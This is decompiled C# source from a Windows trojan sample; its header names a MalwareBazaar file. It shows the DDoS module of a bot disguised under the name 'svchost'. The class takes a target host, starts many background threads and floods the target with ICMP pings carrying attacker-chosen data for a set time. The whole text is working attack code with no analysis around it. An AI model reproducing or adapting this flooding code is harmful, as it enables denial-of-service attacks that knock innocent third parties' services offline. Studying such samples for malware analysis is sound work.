// Decompiled with JetBrains decompiler
// Type: svchost.DDOS.UDP
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

namespace svchost.DDOS
{
  [OptionText]
  [StandardModule]
  public sealed class UDP
  {
    public static string HostToAttack;
    private static object ThreadsEnded = (object) 0;
    private static int ThreadstoUse;
    private static int TimetoAttack;
    private static Thread[] Threads;
    private static bool AttackRunning = false;
    private static int attacks = 0;
    public static int Time;
    public static int Threadsto;
    public static string DOSData;

    public static void StartUDP()
    {
      if (UDP.AttackRunning)
        return;
      if (UDP.HostToAttack.Contains("http://"))
        UDP.HostToAttack = UDP.HostToAttack.Replace("http://", string.Empty);
      if (UDP.HostToAttack.Contains("www."))
        UDP.HostToAttack = UDP.HostToAttack.Replace("www.", string.Empty);
      if (UDP.HostToAttack.Contains("/"))
        UDP.HostToAttack = UDP.HostToAttack.Replace("/", string.Empty);
      UDP.AttackRunning = true;
      UDP.Threads = new Thread[checked (UDP.Threadsto - 1 + 1)];
      int num = checked (UDP.Threadsto - 1);
      int index = 0;
      while (index <= num)
      {
        UDP.Threads[index] = new Thread((ThreadStart) (() => UDP.Attack(UDP.HostToAttack)));
        UDP.Threads[index].IsBackground = true;
        UDP.Threads[index].Start();
        checked { ++index; }
      }
    }

    public static void StopUDP()
    {
      if (!UDP.AttackRunning)
        return;
      int num = checked (UDP.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          UDP.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      UDP.AttackRunning = false;
      UDP.attacks = 0;
    }

    public static void Attack(string Host)
    {
      try
      {
        IPAddress address = IPAddress.Parse(Dns.GetHostAddresses(Host)[0].ToString());
        TimeSpan timeSpan = TimeSpan.FromSeconds((double) UDP.TimetoAttack);
        Stopwatch stopwatch = Stopwatch.StartNew();
label_3:
        if (!(stopwatch.Elapsed < timeSpan))
        {
          Ping ping = new Ping();
          PingOptions options = new PingOptions();
          options.DontFragment = true;
          options.Ttl = 64;
          byte[] bytes = Encoding.ASCII.GetBytes(UDP.DOSData);
          short num = 0;
          do
          {
            ping.Send(address, 100, bytes, options);
            checked { ++num; }
          }
          while (num <= (short) 1000);
          goto label_3;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      UDP.lol();
    }

    private static void lol()
    {
      UDP.ThreadsEnded = Operators.AddObject(UDP.ThreadsEnded, (object) 1);
      if (!Operators.ConditionalCompareObjectEqual(UDP.ThreadsEnded, (object) UDP.ThreadstoUse, true))
        return;
      UDP.ThreadsEnded = (object) 0;
      UDP.ThreadstoUse = 0;
      UDP.AttackRunning = false;
      UDP.attacks = 0;
    }
  }
}
